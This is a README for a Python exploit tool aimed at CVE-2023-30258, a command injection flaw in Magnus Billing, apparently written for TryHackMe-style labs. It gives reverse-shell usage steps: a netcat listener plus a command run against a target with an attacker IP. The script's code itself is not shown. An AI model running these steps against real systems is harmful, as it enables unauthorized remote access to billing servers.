# CVE-2023-30258 - Magnus Billing Command Injection Exploit

![Exploit](https://img.shields.io/badge/Exploit-CVE--2023--30258-red)
![Python](https://img.shields.io/badge/Python-3.x-blue)
![Security](https://img.shields.io/badge/Security-Ethical--Hacking-green)

## 📌 **Description**
This is a Python exploit script for **CVE-2023-30258**, a **Command Injection Vulnerability** found in **Magnus Billing**. The script sends a **base64-encoded reverse shell payload** to the vulnerable endpoint and attempts to gain remote access to the target system.

🔴 **This tool is for educational and authorized penetration testing purposes only.** Unauthorized usage is illegal!

---

## ⚙️ **Requirements**
- Python 3.x  
- A target vulnerable to **CVE-2023-30258**  
- Netcat (`nc`) installed on your attacker machine  

---

## 🚀 **Usage**
### **1️⃣ Start a Netcat Listener**
On your **attacking machine**, run:
```bash
nc -lvnp 1234
```
then:
```bash
python3 mangus_rce.py -t 'http://TARGET_IP/' -lh ATTACKER_IP(tun0 ip in case doing fro THM) -lp LISTENER_PORT (Same as nc)
```

## Help

For help menu:
```
python3 magnus_rce.py -h
```

Example:
  ```python3 scr.py -t 'http://10.10.140.75/' -lh 10.21.137.155 -lp 1234```


## Disclaimer
All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.
